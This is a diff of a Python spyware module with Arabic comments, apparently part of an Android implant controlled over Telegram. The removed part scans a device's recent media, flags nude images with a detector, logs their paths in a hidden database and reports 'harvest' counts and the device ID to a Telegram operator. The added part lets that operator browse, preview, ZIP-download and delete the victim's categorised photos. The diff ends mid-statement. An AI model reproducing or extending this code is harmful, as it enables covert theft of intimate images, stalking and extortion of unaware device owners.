@@ -1,25 +1,13 @@
 # -*- coding: utf-8 -*-
-"""
-وحدة المسح الضوئي للوسائط (MediaScanner) – نسخة محسنة مع معالجة استثناءات شاملة
-- تغليف جميع عمليات SQLite و Base64 في try/except.
-- إعادة محاولة العمليات عند قفل قاعدة البيانات (Database Locked).
-- تخطي الملفات التالفة ومواصلة المسح دون توقف.
-- تحسين إدارة الذاكرة (GC) وتقليل استخدام الموارد.
-- دعم إضافي لملفات الفيديو (اختياري).
-- تقديم تقارير عن التقدم والإحصائيات.
-- متوافق مع Android 10+ باستخدام RELATIVE_PATH بدلاً من DATA.
-"""
-
 import os
 import time
+import zipfile
+import logging
+import random
+import gc
+import json
 import threading
 import hashlib
-import sqlite3
-import logging
-import gc
-import base64
-import random
-from datetime import datetime
 
 # ========== إعداد المسارات الموحدة ==========
 def _get_runtime_path():
@@ -32,644 +20,575 @@ def _get_runtime_path():
         return os.path.join(os.getcwd(), ".sys_runtime")
 
 P = _get_runtime_path()
-DB = os.path.join(P, "m_arch.db")
-if not os.path.exists(P):
-    os.makedirs(P)
+T = os.path.join(P, "g_tmp")     # مجلد مؤقت للمعاينات والتحميلات
+
+# التأكد من وجود المجلدات الأساسية
+try:
+    os.makedirs(P, exist_ok=True)
+    os.makedirs(T, exist_ok=True)
+except Exception as e:
+    logging.error(f"Failed to create runtime directories: {e}")
 
 logging.basicConfig(
-    filename=os.path.join(P, "s.log"),
+    filename=os.path.join(P, "g.log"),
     level=logging.ERROR,
     filemode='a',
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
 try:
-    from jnius import autoclass
-    JNI = True
+    from PIL import Image, ImageOps
+    PIL_AVAILABLE = True
 except ImportError:
-    JNI = False
+    PIL_AVAILABLE = False
 
-# ========== قفل قاعدة البيانات للتزامن ==========
-_db_lock = threading.Lock()
-MAX_RETRIES = 3
-RETRY_DELAY = 0.5  # ثانية
 
-class MediaScanner:
-    def __init__(self, det=None, ui=None):
-        self.det = det          # NudeDetector instance
-        self.ui = ui            # TelegramUI instance
-        self.active = False
-        self._active_lock = threading.Lock()
-        self.did = "Unknown"
-        self._init_db()
+class G:
+    # ✅ الخطأ 1: قائمة الامتدادات المدعومة كمتغير صفي
+    SUPPORTED_IMAGE_EXTS = {'.jpg', '.jpeg', '.png', '.bmp', '.webp', '.gif', '.tiff', '.ico'}
+    SUPPORTED_VIDEO_EXTS = {'.mp4', '.mkv', '.3gp', '.mov', '.avi', '.webm', '.flv'}
 
-        # جلب معرف الجهاز
+    def __init__(self, sc=None, tg=None):
+        self.sc = sc      # MediaScanner instance
+        self.tg = tg      # TelegramUI instance
+        self.ipp = 16     # عدد الصور في الصفحة الواحدة
+        self._timers = []  # الاحتفاظ بالمؤقتات النشطة
+        self._lock = threading.Lock()  # قفل للعمليات المتزامنة
+
+        # ✅ تحسين: قائمة الامتدادات المدعومة
+        self.supported_image_exts = self.SUPPORTED_IMAGE_EXTS
+        self.supported_video_exts = self.SUPPORTED_VIDEO_EXTS
+
+        # التأكد من وجود المجلد المؤقت قبل البدء
         try:
-            if self.ui and hasattr(self.ui, 'm') and hasattr(self.ui.m, 'did'):
-                self.did = self.ui.m.did
-            elif self.ui and hasattr(self.ui, 'device_id'):
-                self.did = self.ui.device_id
-        except:
-            pass
+            os.makedirs(T, exist_ok=True)
+        except Exception as e:
+            logging.error(f"Failed to create temp directory: {e}")
 
-    # ========== دوال مساعدة لقاعدة البيانات مع إعادة المحاولة ==========
-    def _db_connect(self):
-        """إنشاء اتصال بقاعدة البيانات مع إعادة محاولة تلقائية عند القفل."""
-        for attempt in range(MAX_RETRIES):
-            try:
-                conn = sqlite3.connect(DB, check_same_thread=False, timeout=10.0)
-                conn.execute("PRAGMA journal_mode=WAL")  # تحسين التوافق مع الكتابة المتزامنة
-                return conn
-            except sqlite3.OperationalError as e:
-                if "locked" in str(e).lower() and attempt < MAX_RETRIES - 1:
-                    time.sleep(RETRY_DELAY * (attempt + 1))
-                    continue
-                logging.error(f"DB connection error after {attempt+1} attempts: {e}")
-                raise
-        return None
+        self._cleanup_old_temp()
+        # ✅ الخطأ 2: تنظيف المؤقتات المعلقة عند بدء التشغيل
+        self._cleanup_timers()
 
-    def _db_execute(self, query, params=(), fetch_one=False, fetch_all=False, commit=False):
-        """تنفيذ استعلام قاعدة البيانات مع إعادة محاولة مدمجة."""
-        conn = None
-        cursor = None
-        for attempt in range(MAX_RETRIES):
-            try:
-                conn = self._db_connect()
-                if conn is None:
-                    raise sqlite3.OperationalError("Failed to connect to DB")
-                cursor = conn.cursor()
-                cursor.execute(query, params)
-                result = None
-                if fetch_one:
-                    result = cursor.fetchone()
-                elif fetch_all:
-                    result = cursor.fetchall()
-                if commit:
-                    conn.commit()
-                return result
-            except sqlite3.OperationalError as e:
-                if "locked" in str(e).lower() and attempt < MAX_RETRIES - 1:
-                    time.sleep(RETRY_DELAY * (attempt + 1))
-                    continue
-                logging.error(f"DB execute error: {e} - Query: {query[:100]}")
-                raise
-            except Exception as e:
-                logging.error(f"DB execute error: {e} - Query: {query[:100]}")
-                raise
-            finally:
-                if cursor:
-                    try:
-                        cursor.close()
-                    except:
-                        pass
-                if conn:
-                    try:
-                        conn.close()
-                    except:
-                        pass
-        return None
-
-    def _db_executemany(self, query, param_list, commit=False):
-        """تنفيذ استعلام متعدد (executemany) مع إعادة محاولة."""
-        conn = None
-        cursor = None
-        for attempt in range(MAX_RETRIES):
-            try:
-                conn = self._db_connect()
-                if conn is None:
-                    raise sqlite3.OperationalError("Failed to connect to DB")
-                cursor = conn.cursor()
-                cursor.executemany(query, param_list)
-                if commit:
-                    conn.commit()
+    # ========== تنظيف الملفات المؤقتة القديمة ==========
+    def _cleanup_old_temp(self):
+        """تنظيف الملفات المؤقتة الأقدم من ساعة"""
+        try:
+            if not os.path.exists(T):
                 return
-            except sqlite3.OperationalError as e:
-                if "locked" in str(e).lower() and attempt < MAX_RETRIES - 1:
-                    time.sleep(RETRY_DELAY * (attempt + 1))
-                    continue
-                logging.error(f"DB executemany error: {e} - Query: {query[:100]}")
-                raise
-            except Exception as e:
-                logging.error(f"DB executemany error: {e}")
-                raise
-            finally:
-                if cursor:
+            now = time.time()
+            for f in os.listdir(T):
+                path = os.path.join(T, f)
+                try:
+                    if os.path.isfile(path) and os.path.getmtime(path) < now - 3600:
+                        os.remove(path)
+                except Exception as e:
+                    logging.error(f"Error removing old temp file {path}: {e}")
+        except Exception as e:
+            logging.error(f"Gallery cleanup error: {e}")
+
+    # ========== تنظيف المؤقتات ==========
+    def _cleanup_timers(self):
+        """إلغاء وتنظيف جميع المؤقتات المعلقة"""
+        try:
+            for timer in self._timers:
+                if timer and timer.is_alive():
                     try:
-                        cursor.close()
+                        timer.cancel()
                     except:
                         pass
-                if conn:
-                    try:
-                        conn.close()
-                    except:
-                        pass
-
-    # ========== نظام تشفير محسّن (Base64 فقط) مع معالجة استثناءات ==========
-    def _enc(self, text: str) -> str:
-        """
-        تشفير المسار باستخدام Base64 فقط.
-        يعيد النص المشفر أو النص الأصلي في حالة الخطأ (لن يتوقف المسح).
-        """
-        if not text:
-            return ""
-        try:
-            data = text.encode('utf-8')
-            return base64.urlsafe_b64encode(data).decode()
+            self._timers.clear()
+            logging.debug("All timers cleaned up")
         except Exception as e:
-            logging.error(f"Encoding error for '{text[:50]}...': {e}")
-            return text  # الاحتفاظ بالنص الأصلي لتجنب فقدان البيانات
+            logging.error(f"Timer cleanup error: {e}")
 
-    def _dec(self, enc_text: str) -> str:
-        """
-        فك تشفير المسار باستخدام Base64.
-        يعيد النص المفكوك أو النص المشفر الأصلي في حالة الخطأ.
-        """
-        if not enc_text:
-            return ""
+    def cancel_all_timers(self):
+        """واجهة خارجية لإلغاء جميع المؤقتات"""
+        self._cleanup_timers()
+
+    # ========== حذف آمن ==========
+    def _safe_remove(self, path):
+        """حذف ملف مع معالجة الأخطاء"""
         try:
-            data = base64.urlsafe_b64decode(enc_text.encode())
-            return data.decode('utf-8')
+            if os.path.exists(path):
+                os.remove(path)
+                return True
         except Exception as e:
-            logging.error(f"Decoding error for '{enc_text[:50]}...': {e}")
-            return enc_text
+            logging.error(f"Safe remove error {path}: {e}")
+        return False
 
-    # ========== إدارة قاعدة البيانات ==========
-    def _init_db(self):
-        """تهيئة قاعدة البيانات مع التحقق من الصحة، مع تغليف كل عملية في try/except."""
-        try:
-            conn = self._db_connect()
-            if conn is None:
-                raise sqlite3.OperationalError("Cannot connect to DB")
-            try:
-                with conn:
-                    conn.execute('''CREATE TABLE IF NOT EXISTS media (
-                        h TEXT PRIMARY KEY,
-                        p TEXT,
-                        ts INTEGER,
-                        cat TEXT DEFAULT 'pending',
-                        score REAL DEFAULT 0,
-                        fsize INTEGER DEFAULT 0)''')
-                    conn.execute('CREATE INDEX IF NOT EXISTS idx_cat ON media(cat)')
-                    conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON media(ts)')
-                    conn.commit()
-            finally:
-                conn.close()
-        except Exception as e:
-            logging.error(f"DB Init error: {e}")
+    # ========== التحقق من التبعيات ==========
+    def _check_dependencies(self):
+        """التحقق من توفر المكونات الأساسية"""
+        if self.sc is None:
+            logging.error("MediaScanner not available")
+            return False
+        if self.tg is None:
+            logging.error("TelegramUI not available")
+            return False
+        return True
 
-    def _partial_hash(self, path: str) -> str:
-        """
-        حساب هاش جزئي للملف (الأول 2KB + الحجم + التاريخ).
-        يعيد الهاش أو None في حالة الخطأ.
-        """
-        try:
-            if not os.path.exists(path):
-                return None
-            st = os.stat(path)
-            base = f"{st.st_size}_{int(st.st_mtime)}"
-            with open(path, "rb") as f:
-                head = f.read(2048)
-            return hashlib.md5(head + base.encode()).hexdigest()
-        except Exception as e:
-            logging.error(f"Hash error for {path}: {e}")
-            return None
-
-    def _safe_path(self, path: str) -> bool:
-        """التحقق من أن المسار آمن ولا يحتوي على مجلدات نظام."""
+    # ========== التحقق من امتداد الملف ==========
+    def _is_image_file(self, path):
+        """التحقق من أن الملف صورة مدعومة"""
         if not path or not isinstance(path, str):
             return False
-        bad = ["/Android/", "/obb/", "/data/", "/."]
-        basename = os.path.basename(path)
-        return not any(x in path for x in bad) and not basename.startswith(".")
-
-    def _is_media_file(self, path: str) -> bool:
-        """التحقق من أن الملف صورة أو فيديو (اختياري)."""
         ext = os.path.splitext(path)[1].lower()
-        image_exts = ['.jpg', '.jpeg', '.png', '.bmp', '.webp', '.gif', '.tiff', '.raw']
-        video_exts = ['.mp4', '.mkv', '.avi', '.mov', '.3gp', '.webm']  # اختياري
-        return ext in image_exts or ext in video_exts  # يمكنك تعديل حسب الحاجة
+        return ext in self.supported_image_exts
 
-    # ========== التحقق من الصلاحيات ==========
-    def _check_storage_permission(self):
-        """التحقق من صلاحية قراءة التخزين."""
-        if not JNI:
-            return True
-        try:
-            from android.permissions import check_permission, Permission
-            return check_permission(Permission.READ_EXTERNAL_STORAGE)
-        except Exception as e:
-            logging.error(f"Permission check error: {e}")
-            return True
+    def _is_video_file(self, path):
+        """التحقق من أن الملف فيديو مدعوم"""
+        if not path or not isinstance(path, str):
+            return False
+        ext = os.path.splitext(path)[1].lower()
+        return ext in self.supported_video_exts
 
-    # ========== مسح سريع لآخر 48 ساعة (متوافق مع Android 10+) ==========
-    def _fast_scan(self, limit=100, hours=48):
-        """
-        مسح سريع للصور والفيديوهات الجديدة (آخر 48 ساعة).
-        متوافق مع Android 10+ باستخدام RELATIVE_PATH.
-        """
-        if not JNI:
-            return []
-
-        if not self._check_storage_permission():
-            logging.warning("Storage permission not granted")
-            return []
-
-        cursor = None
-        results = []
-        try:
-            act = autoclass('org.kivy.android.PythonActivity').mActivity
-            resolver = act.getContentResolver()
-            MediaStore = autoclass('android.provider.MediaStore')
-
-            time_threshold = int(time.time()) - (hours * 3600)
-            
-            # ✅ الخطأ 1: استخدام RELATIVE_PATH بدلاً من DATA للتوافق مع Android 10+
-            img_uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            projection = ["_data", "relative_path", "display_name", "date_added", "mime_type"]
-            selection = "date_added > ? AND (mime_type LIKE ? OR mime_type LIKE ?)"
-            args = [str(time_threshold), "image/%", "video/%"]
-            order = "date_added DESC LIMIT " + str(limit)
-
-            cursor = resolver.query(img_uri, projection, selection, args, order)
-            if cursor:
-                idx_data = cursor.getColumnIndex("_data")
-                idx_relative_path = cursor.getColumnIndex("relative_path")
-                idx_display_name = cursor.getColumnIndex("display_name")
-                
-                while cursor.moveToNext():
-                    p = None
-                    
-                    # محاولة الحصول على المسار المطلق أولاً
-                    try:
-                        p = cursor.getString(idx_data)
-                    except:
-                        pass
-                    
-                    # إذا كان المسار المطلق غير متاح، حاول بناء المسار من RELATIVE_PATH و DISPLAY_NAME
-                    if not p or not os.path.exists(p):
-                        try:
-                            relative = cursor.getString(idx_relative_path)
-                            display_name = cursor.getString(idx_display_name)
-                            if relative and display_name:
-                                # بناء المسار الكامل
-                                p = os.path.join("/storage/emulated/0", relative, display_name)
-                        except:
-                            pass
-                    
-                    # التحقق من صحة المسار
-                    if p and os.path.exists(p) and self._safe_path(p) and self._is_media_file(p):
-                        results.append(p)
-            
-            logging.info(f"Fast scan completed: found {len(results)} media files")
-            return results
-            
-        except Exception as e:
-            logging.error(f"Scan error: {e}")
-            return []
-        finally:
-            if cursor:
-                try:
-                    cursor.close()
-                except:
-                    pass
-            gc.collect()
-
-    # ========== معالجة الملفات الجديدة (مع تغليف كل عملية) ==========
-    def _process_files(self, paths):
-        """معالجة الملفات المكتشفة وتصنيفها، مع تخطي أي ملف يسبب خطأ."""
-        if not paths:
-            return
-
-        with self._active_lock:
-            if self.active:
-                return
-            self.active = True
-
-        sensitive_count = 0
-        processed = 0
-        now = int(time.time())
-
-        try:
-            # استخدام اتصال واحد للدفعة مع إعادة محاولة عند الافتتاح
-            conn = None
-            try:
-                conn = self._db_connect()
-                if conn is None:
-                    raise sqlite3.OperationalError("Cannot connect to DB")
-                conn.execute("BEGIN TRANSACTION")
-            except Exception as e:
-                logging.error(f"Failed to open DB connection: {e}")
-                self.active = False
-                return
-
-            try:
-                for p in paths:
-                    try:
-                        # التحقق من وجود الملف
-                        if not os.path.exists(p):
-                            continue
-
-                        h = self._partial_hash(p)
-                        if not h:
-                            continue
-
-                        # تجنب التكرار (استعلام داخل try)
-                        try:
-                            cur = conn.execute("SELECT 1 FROM media WHERE h=?", (h,))
-                            if cur.fetchone():
-                                continue
-                        except Exception as e:
-                            logging.error(f"Check existence error for {p}: {e}")
-                            continue
-
-                        cat = 'pending'
-                        score = 0.0
-                        fsize = os.path.getsize(p) if os.path.exists(p) else 0
-
-                        # التحليل بالـ AI إذا كان متوفراً
-                        if self.det and hasattr(self.det, 'analyze') and self.det.model is not None:
-                            try:
-                                prob = self.det.analyze(p)
-                                if prob > 0.85:
-                                    cat = 'nude'
-                                    score = prob
-                                    sensitive_count += 1
-                                elif prob > 0.45:
-                                    cat = 'questionable'
-                                    score = prob
-                                    sensitive_count += 1
-                                else:
-                                    cat = 'normal'
-                                    score = prob
-                            except Exception as e:
-                                logging.error(f"AI analysis error for {p}: {e}")
-                                cat = 'pending'
-
-                        # إدراج في قاعدة البيانات (مع try/except)
-                        try:
-                            conn.execute(
-                                "INSERT INTO media (h, p, ts, cat, score, fsize) VALUES (?, ?, ?, ?, ?, ?)",
-                                (h, self._enc(p), now, cat, score, fsize)
-                            )
-                            processed += 1
-                        except Exception as e:
-                            logging.error(f"Insert error for {p}: {e}")
-                            continue
-
-                        # تنظيف كل 20 ملف
-                        if processed % 20 == 0:
-                            gc.collect()
-
-                    except Exception as e:
-                        logging.error(f"Unexpected error processing {p}: {e}")
-                        continue
-
-                # ✅ الخطأ 2: حماية عملية commit مع rollback
-                try:
-                    conn.commit()
-                    logging.info(f"Successfully committed {processed} files to database")
-                except Exception as e:
-                    logging.error(f"Commit error: {e}")
-                    try:
-                        conn.rollback()
-                        logging.info("Transaction rolled back")
-                    except Exception as rollback_error:
-                        logging.error(f"Rollback error: {rollback_error}")
-                    raise
-
-            except Exception as e:
-                logging.error(f"Batch processing error: {e}")
-                try:
-                    conn.rollback()
-                except:
-                    pass
-            finally:
-                try:
-                    conn.close()
-                except:
-                    pass
-
-            # إشعار بالصور الحساسة المكتشفة
-            if sensitive_count > 0 and self.ui:
-                try:
-                    if hasattr(self.ui, 'notify_harvest'):
-                        self.ui.notify_harvest(self.did, sensitive_count)
-                    elif hasattr(self.ui, '_api'):
-                        ctrl = getattr(self.ui, 'ctrl', None)
-                        if ctrl:
-                            self.ui._api("sendMessage", {
-                                "chat_id": ctrl,
-                                "text": f"🔞 تم اكتشاف {sensitive_count} صورة حساسة على الجهاز {self.did}"
-                            })
-                except Exception as e:
-                    logging.error(f"Notify error: {e}")
-
-        except Exception as e:
-            logging.error(f"Process error: {e}")
-        finally:
-            with self._active_lock:
-                self.active = False
-            gc.collect()
-
-    # ========== توليد صورة مصغرة (مع تغليف جميع العمليات) ==========
-    def get_thumbnail(self, path):
-        """إنشاء صورة مصغرة للملف (صور وفيديو)."""
-        if not JNI or not os.path.exists(path) or not self._is_media_file(path):
+    # ========== إنشاء صورة مصغرة ==========
+    def _thumbnail(self, path, size=(300, 300)):
+        """إنشاء صورة مصغرة مع التحقق من الصحة"""
+        if not PIL_AVAILABLE or not os.path.exists(path):
+            return None
+        
+        # ✅ الخطأ 1: التحقق من الامتداد باستخدام الدوال المخصصة
+        if not self._is_image_file(path):
+            logging.debug(f"Skipping non-image file: {path}")
             return None
 
-        cursor = None
         try:
-            # تنظيف المصغرات القديمة (أكثر من 10 دقائق)
-            now = time.time()
-            for f in os.listdir(P):
-                if f.startswith("th_"):
-                    try:
-                        fpath = os.path.join(P, f)
-                        if os.path.getmtime(fpath) < now - 600:
-                            os.remove(fpath)
-                    except:
-                        pass
+            with Image.open(path) as img:
+                # التوافق مع الإصدارات المختلفة من PIL
+                try:
+                    resample = Image.Resampling.LANCZOS
+                except AttributeError:
+                    resample = Image.LANCZOS
 
-            MediaStore = autoclass('android.provider.MediaStore')
-            BitmapFactory = autoclass('android.graphics.BitmapFactory')
-            CompressFormat = autoclass('android.graphics.Bitmap$CompressFormat')
-            FileOutputStream = autoclass('java.io.FileOutputStream')
+                img = ImageOps.fit(img, size, method=resample, centering=(0.5, 0.5))
+                # التأكد من وجود المجلد المؤقت
+                os.makedirs(T, exist_ok=True)
+                out_path = os.path.join(T, f"th_{int(time.time()*1000)}_{random.randint(1000,9999)}.jpg")
+                img.save(out_path, "JPEG", quality=70, optimize=True)
 
-            act = autoclass('org.kivy.android.PythonActivity').mActivity
-            resolver = act.getContentResolver()
-
-            uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            sel = MediaStore.Images.Media.RELATIVE_PATH + "=?"
-            cursor = resolver.query(uri, ["_id"], sel, [os.path.dirname(path)], None)
-
-            if cursor and cursor.moveToFirst():
-                idx_id = cursor.getColumnIndex("_id")
-                img_id = cursor.getLong(idx_id)
-
-                options = BitmapFactory.Options()
-                options.inSampleSize = 4
-
-                bitmap = MediaStore.Images.Thumbnails.getThumbnail(
-                    resolver, img_id,
-                    MediaStore.Images.Thumbnails.MINI_KIND,
-                    options
-                )
-
-                if bitmap:
-                    out_path = os.path.join(P, f"th_{int(time.time())}_{random.randint(1000,9999)}.jpg")
-                    fos = FileOutputStream(out_path)
-                    bitmap.compress(CompressFormat.JPEG, 60, fos)
-                    fos.flush()
-                    fos.close()
-                    bitmap.recycle()
-
-                    if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
-                        return out_path
+                # التحقق من إنشاء الملف
+                if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
+                    return out_path
+                return None
 
         except Exception as e:
             logging.error(f"Thumbnail error for {path}: {e}")
-        finally:
-            if cursor:
-                try:
-                    cursor.close()
-                except:
-                    pass
-            gc.collect()
-        return None
+            return None
 
-    # ========== جلب المعرض حسب التصنيف (مع تغليف) ==========
-    def get_gallery_by_category(self, category, limit=16, page=0):
-        """جلب قائمة الملفات حسب الفئة مع ترتيب زمني تنازلي."""
-        if not isinstance(limit, int) or limit < 1:
-            limit = 16
-        if not isinstance(page, int) or page < 0:
-            page = 0
+    # ========== دالة مساعدة: تحويل اسم الفئة ==========
+    def _get_category_emoji(self, cat):
+        emoji_map = {
+            "pending": "📷",
+            "nude": "🔞",
+            "questionable": "⚠️",
+            "normal": "✅"
+        }
+        text_map = {
+            "pending": "جديد",
+            "nude": "حساس",
+            "questionable": "مشبوه",
+            "normal": "عادي"
+        }
+        return emoji_map.get(cat, "🖼️"), text_map.get(cat, cat)
 
-        offset = page * limit
-        results = []
+    # ========== واجهة لوحة المفاتيح ==========
+    def get_grid_kb(self, cat="pending", page=0):
+        """إنشاء لوحة مفاتيح تفاعلية للمعرض"""
+        if not self._check_dependencies():
+            return {"inline_keyboard": [[{"text": "❌ الخدمة غير متوفرة", "callback_data": "nop"}]]}
 
         try:
-            # ✅ الخطأ 3: ترتيب النتائج بـ ORDER BY ts DESC
-            query = "SELECT h, p, cat, score, fsize FROM media WHERE cat=? ORDER BY ts DESC LIMIT ? OFFSET ?"
-            rows = self._db_execute(query, (category, limit, offset), fetch_all=True)
-            if not rows:
-                return results
-
-            to_delete = []
-            for i, row in enumerate(rows):
-                try:
-                    path = self._dec(row[1])
-                    if os.path.exists(path):
-                        results.append({
-                            "hash": row[0],
-                            "path": path,
-                            "cat": row[2],
-                            "score": row[3],
-                            "size": row[4] if len(row) > 4 else 0,
-                            "label": str(offset + i + 1).zfill(2)
-                        })
-                    else:
-                        to_delete.append((row[0],))
-                except Exception as e:
-                    logging.error(f"Gallery row error: {e}")
-                    to_delete.append((row[0],))
-
-            # حذف الملفات غير الموجودة دفعة واحدة
-            if to_delete:
-                self._db_executemany("DELETE FROM media WHERE h=?", to_delete, commit=True)
-
+            stats = self.sc.get_statistics()
+            if stats is None:
+                stats = {}
         except Exception as e:
-            logging.error(f"Gallery error: {e}")
+            logging.error(f"Stats error: {e}")
+            stats = {}
 
-        return results
+        try:
+            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
+            if items is None:
+                items = []
+        except Exception as e:
+            logging.error(f"Gallery fetch error: {e}")
+            items = []
 
-    # ========== تحديث فئة ملف ==========
-    def update_category(self, file_hash, category, score=0):
-        """تحديث تصنيف ملف."""
-        if not file_hash:
+        total = stats.get(cat, 0)
+        total_pages = (total + self.ipp - 1) // self.ipp if total > 0 else 1
+
+        keyboard = []
+
+        # صف أزرار الفئات
+        cats_row = []
+        for c in ["pending", "nude", "questionable", "normal"]:
+            count = stats.get(c, 0)
+            if count > 0:
+                emoji, name = self._get_category_emoji(c)
+                display = f"{emoji} {name} ({count})" if c != cat else f"✅ {emoji} {name} ({count})"
+                cats_row.append({"text": display, "callback_data": f"g_nav|{c}|0"})
+        if cats_row:
+            keyboard.append(cats_row[:4])
+
+        # شبكة الصور 4×4
+        row = []
+        for i in range(self.ipp):
+            if i < len(items):
+                label = items[i].get("label", str((page * self.ipp) + i + 1).zfill(2))
+                btn = {"text": f"🖼 {label}", "callback_data": f"g_opt|{cat}|{page}|{i}"}
+            else:
+                btn = {"text": "⬛", "callback_data": "nop"}
+            row.append(btn)
+            if len(row) == 4:
+                keyboard.append(row)
+                row = []
+        if row:
+            keyboard.append(row)
+
+        # أزرار التنقل بين الصفحات
+        nav_buttons = []
+        if page > 0:
+            nav_buttons.append({"text": "⏮️", "callback_data": f"g_nav|{cat}|{page-1}"})
+        nav_buttons.append({"text": f"📄 {page+1}/{max(1, total_pages)}", "callback_data": "nop"})
+        if len(items) == self.ipp and (page + 1) < total_pages:
+            nav_buttons.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
+        keyboard.append(nav_buttons)
+
+        # زر التحميل الجماعي للصفحة
+        if items:
+            keyboard.append([{"text": "📦 تحميل الصفحة الحالية (ZIP)", "callback_data": f"g_bulk|{cat}|{page}"}])
+
+        return {"inline_keyboard": keyboard}
+
+    # ========== عرض خيارات ملف معين ==========
+    def show_options(self, cid, cat, page_str, idx_str):
+        """عرض خيارات التفاعل مع ملف محدد"""
+        if not self._check_dependencies():
             return
-        try:
-            self._db_execute("UPDATE media SET cat=?, score=? WHERE h=?", (category, score, file_hash), commit=True)
-        except Exception as e:
-            logging.error(f"Update category error: {e}")
 
-    # ========== إحصائيات ==========
-    def get_statistics(self):
-        """جلب إحصائيات قاعدة البيانات."""
-        stats = {'nude': 0, 'questionable': 0, 'normal': 0, 'pending': 0}
         try:
-            rows = self._db_execute("SELECT cat, COUNT(*), SUM(fsize) FROM media GROUP BY cat", fetch_all=True)
-            if rows:
-                for row in rows:
-                    if row[0] in stats:
-                        stats[row[0]] = row[1]
-                total_size = sum(row[1] for row in rows if row[1] is not None)  # الإجمالي
-                stats['total_size_mb'] = round((total_size or 0) / (1024 * 1024), 2)
-                stats['total_files'] = sum(stats.get(c, 0) for c in ['nude', 'questionable', 'normal', 'pending'])
-        except Exception as e:
-            logging.error(f"Statistics error: {e}")
-        return stats
+            page = int(page_str)
+            idx = int(idx_str)
+        except ValueError:
+            logging.error(f"Invalid page/index: {page_str}, {idx_str}")
+            return
 
-    # ========== إزالة من قاعدة البيانات ==========
-    def remove_from_db(self, path):
-        """إزالة ملف من قاعدة البيانات."""
         try:
-            h = self._partial_hash(path)
-            if h:
-                self._db_execute("DELETE FROM media WHERE h=?", (h,), commit=True)
+            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
+            if items is None or idx >= len(items):
+                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
+                return
         except Exception as e:
-            logging.error(f"Remove from DB error: {e}")
+            logging.error(f"Show options error: {e}")
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب البيانات."})
+            return
 
-    # ========== تنظيف قاعدة البيانات ==========
-    def _cleanup_db(self):
-        """تنظيف قاعدة البيانات من الملفات المحذوفة والقديمة."""
+        item = items[idx]
+        path = item.get('path')
+        label = item.get("label", "??")
+        
+        if not path or not os.path.exists(path):
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود على الجهاز."})
+            return
+
         try:
-            # حذف الملفات غير الموجودة
-            rows = self._db_execute("SELECT h, p FROM media", fetch_all=True)
-            if rows:
-                to_del = []
-                for h, p_enc in rows:
+            size_mb = round(os.path.getsize(path) / (1024 * 1024), 1)
+        except Exception:
+            size_mb = 0
+
+        kb = [
+            [{"text": "👁 معاينة", "callback_data": f"g_act|pr|{cat}|{page}|{idx}"}],
+            [
+                {"text": "⬇️ تحميل (ZIP)", "callback_data": f"g_act|dw|{cat}|{page}|{idx}"},
+                {"text": "🗑 حذف", "callback_data": f"g_conf|de|{cat}|{page}|{idx}"}
+            ],
+            [{"text": "🔙 عودة", "callback_data": f"g_nav|{cat}|{page}"}]
+        ]
+        
+        try:
+            self.tg._api("sendMessage", {
+                "chat_id": cid,
+                "text": f"📦 **#{label}**  |  حجم: `{size_mb} MB`\n📂 الفئة: `{cat}`",
+                "reply_markup": json.dumps({"inline_keyboard": kb}),
+                "parse_mode": "Markdown"
+            })
+        except Exception as e:
+            logging.error(f"Send options error: {e}")
+
+    # ========== تنفيذ الإجراءات ==========
+    def execute_action(self, cid, action, cat, page_str, idx_str=None):
+        """تنفيذ الإجراء المطلوب"""
+        if not self._check_dependencies():
+            return
+
+        try:
+            page = int(page_str)
+        except ValueError:
+            logging.error(f"Invalid page: {page_str}")
+            return
+
+        # معالجة التحميل الجماعي (bulk)
+        if action == "bulk":
+            self._handle_bulk_download(cid, cat, page)
+            return
+
+        # الإجراءات الفردية
+        if idx_str is None:
+            return
+            
+        try:
+            idx = int(idx_str)
+        except ValueError:
+            logging.error(f"Invalid index: {idx_str}")
+            return
+
+        try:
+            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
+            if items is None or idx >= len(items):
+                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
+                return
+        except Exception as e:
+            logging.error(f"Execute action error: {e}")
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب البيانات."})
+            return
+
+        item = items[idx]
+        path = item.get('path')
+        label = item.get("label", "??")
+
+        if not path:
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ مسار الملف غير صالح."})
+            return
+
+        if action == "pr":
+            self._preview(cid, path)
+        elif action == "dw":
+            self._download(cid, path, label)
+        elif action == "del" or action == "de":  # de من g_conf
+            self._delete(cid, path, label, cat, page)
+        else:
+            logging.warning(f"Unknown action: {action}")
+
+    # ========== معالجة التحميل الجماعي ==========
+    def _handle_bulk_download(self, cid, cat, page):
+        """معالجة تحميل صفحة كاملة كـ ZIP"""
+        if not self._check_dependencies():
+            return
+
+        try:
+            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
+            if not items:
+                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ لا توجد صور في هذه الصفحة."})
+                return
+
+            # التحقق من المساحة
+            total_size = 0
+            for item in items:
+                path = item.get('path')
+                if path and os.path.exists(path):
                     try:
-                        if not os.path.exists(self._dec(p_enc)):
-                            to_del.append((h,))
-                    except:
-                        to_del.append((h,))
-                if to_del:
-                    self._db_executemany("DELETE FROM media WHERE h=?", to_del, commit=True)
+                        total_size += os.path.getsize(path)
+                    except Exception:
+                        pass
+            if total_size > 100 * 1024 * 1024:  # 100MB
+                self.tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ حجم الصفحة كبير جداً (>100MB). حاول صفحة أخرى."})
+                return
 
-            # حذف الأقدم من 5000 صورة
-            self._db_execute("""
-                DELETE FROM media WHERE h NOT IN 
-                (SELECT h FROM media ORDER BY ts DESC LIMIT 5000)
